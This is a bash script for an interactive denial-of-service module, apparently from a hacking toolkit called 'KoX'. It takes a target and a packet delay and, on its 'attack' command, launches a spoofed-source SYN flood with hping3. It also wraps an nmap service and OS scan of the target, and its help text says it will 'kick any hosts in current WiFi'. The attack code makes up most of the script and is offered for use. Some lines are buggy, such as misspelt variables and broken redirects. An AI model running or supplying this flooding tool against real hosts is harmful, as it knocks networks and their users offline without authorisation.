#! /bin/bash
 
 bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`

clear


largefunc () {


  
  shellterm () {  # <--- START OF SHELL FUNCTION
  echo 
  read -p "Shell Terminal($lightred D.o.S$normal ) > " shellcmd
  } # <--- END OF SHELL FUNCTION
  shellterm


if [ $shellcmd == set_target ]
then
  read -p "New$lighred Target$normal > " targetset
  target="$targetset"
  echo -e "New Target ==> $targetset"
fi

if [ $shellcmd == set_delay ]
then
  read -p "New$lighred Delay$normal > " delayset
  delay="$delayset"
  echo -e "New Delay ==> $delayset"
fi

if [ $shellcmd == attack ]
then
  dosattack () {
  echo -e "Launching Attack on $targetset ...."
  sleep 2
  hping3 --rand-source -i $delayset -S --flood -V $targetset
  }
  dosattack
fi
if [ $shellcmd == port_scanner ]
then
  echo -e "Launching Nmap for ports/services/protocols scanning...."
  sleep 2
  if [ -d /bin/KoX/Config/Modules/nmap$targetset.txt ]
  then
    rm nmap$targetset.txt 1> /dev/null/ 2>&1 
  fi
  if [ -d /bin/KoX/Config/Modules/$targetset.txt ]
  then
     rm $targetset.txt 1> /dev/null/ 2>&1
  fi
  nmap -sV --osscan-guess -oG nmap$targetset.txt $targetset
  cat nmap$targetset.txt | grep open /n > $targetset.txt
  rm nmap$targetset.txt
  cat $targetset.txt
  read -p "Press any keys to continue ..."
  rm nmap$targetset.txt 1> /dev/null/ 2>&1
fi
    


















case $shellcmd in
      help) echo "
      help - Display shells commands.
      options - See avaible options you can set.
      set_target - Set Target to attack.
      set_delay - Set delay between each packets.
      attack - Launch Module.
      quit - Quit terminal shell."
      largefunc ;;
      options) echo "
      This module will kick any hosts in current WiFi.
      Use WiFi Jammer to kill the WiFi.
      This module can be easily stopped by any firewalls.	

      [!]=REQUIRED [O]=OPTIONAL
      ---------------------------------------------------
      Coded by Ghosty/DeaDHackS.

       -DESCRIPTION-                -CURRENT-
      Target to attack.          [!]Target: $target    
      Delay between requests     [O]Delay : $delay   
      
      ---------------------------------------------------
      port_scanner - Will execute a script which will scan host for ports and services.
      (Target is required) 
     
      firewall_scanner - Will launch WAFW00F to scan for any known firewall(s).
      (Target required)"
      largefunc ;;
   quit) kox ;;
      *) echo 
      largefunc ;;
esac

target="$targetset"
delay="$delayset"
























 

} # <-- "{" ENDING OF MAIN FUNCTION
largefunc
